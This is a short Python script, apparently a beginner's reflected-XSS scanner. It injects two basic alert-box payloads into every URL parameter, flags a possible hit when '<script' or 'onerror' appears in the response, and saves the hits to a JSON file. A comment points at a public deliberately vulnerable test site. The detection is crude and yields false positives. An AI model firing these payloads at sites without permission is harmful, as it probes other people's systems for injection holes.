import requests
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# XSS payloads
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>"
]

results = []

base_url = input("Enter target URL (with ?param=): ").strip()
parsed_url = urlparse(base_url)
query_params = parse_qs(parsed_url.query)

if not query_params:
    print("No parameters found to test!")
    exit()

for payload in payloads:
    test_params = query_params.copy()
    for key in test_params:
        test_params[key] = payload

    new_query = urlencode(test_params, doseq=True)
    target_url = urlunparse(parsed_url._replace(query=new_query))

    print("Testing:", target_url)
    response = requests.get(target_url, timeout=5)

    # broader detection
    page_lower = response.text.lower()
    if "<script" in page_lower or "onerror" in page_lower:
        print("[+] Possible XSS detected!")
        results.append({
            "url": target_url,
            "payload": payload,
            "status": "Possible XSS"
        })
    else:
        print("[-] Not detected.")

# Always save results to JSON
with open("xss_report.json", "w") as f:
    json.dump(results, f, indent=4)

print("Scan complete — results in xss_report.json")


#http://testphp.vulnweb.com/search.php?test=id=1